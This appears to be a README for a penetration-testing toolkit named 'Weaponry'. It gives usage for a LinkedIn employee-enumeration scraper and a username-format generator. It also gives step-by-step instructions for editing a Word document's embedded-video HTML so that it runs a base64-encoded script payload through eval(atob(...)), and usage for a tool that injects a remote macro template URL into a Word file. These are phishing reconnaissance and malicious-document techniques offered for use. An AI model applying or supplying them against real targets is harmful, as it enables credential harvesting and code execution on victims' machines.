# Weaponry
A collection of tools for every PENTEST engagements

**MRV-LLC**
*Enumerates target company for employees' contact information via Linkedin service*

[*] Usage:
ruby mrv-lcc.rb -u <username> -c <company name> -p <optional>

OPTIONS:
- -u      Email address
- -c      Company name
- -p      (Optional, Default: ALL) EX: -p 3-4, only craw between page 3 to 4.
   
Results:

first,last, Title at X company

**MRV-USERNAME-GENERATOR**

ruby mrv-username-generator.rb -F format -f firstname -l lastname

./mrv-username-generator.rb --list-formats

Format
lastnamef - lastname + first initial
flastname - first initial + lastname
firstnamel - firstname + last initial
lfirstname - last initial + first name

**Word-Video-Embed**

- Create a word document with embedded video in it.
- Save your document to docx.
- Rename your document.docx to document.zip
- Open and Edit document.xml with a text editor of your choice.
- Find the line where it has "embeddedHtml".
- Delete all the default value from "embeddedHtml" and Replace with &lt;script&gt;eval(atob('BASE64'));&lt;/script&gt;.
- Replace the "base64Payload" in trigger.txt with your desired payload.
- On Linux device, run the command: base64 -w trigger.txt > triggerB64.txt
- On Windows device, use your favorite base64 encoder to encode the trigger.txt file. 
- Copy encoding to document.xml and replace the BASE64 word with the encoded payload. 
- Save document.xml and copy it back to word\document.xml 
- Rename document.zip to document.docx 

**MacroInjection.py**

python3 MacroInjection.py -h

Usage: MacroInjection.py [options] filename

Macro Remote Injection - Mr.V (Ring0Labs)

Options:

  --version             show program's version number and exit
  
  -h, --help            show this help message and exit
  
  -f File, --file=File  Word Document File Name, ex: myword.docm
  
  -t Type, --type=Type  Remote Server Type: smb | http | https  - Default
                        https
  -u URL, --url=URL     Remote Macro Template URL, ex: myserver.com/macro.dotm
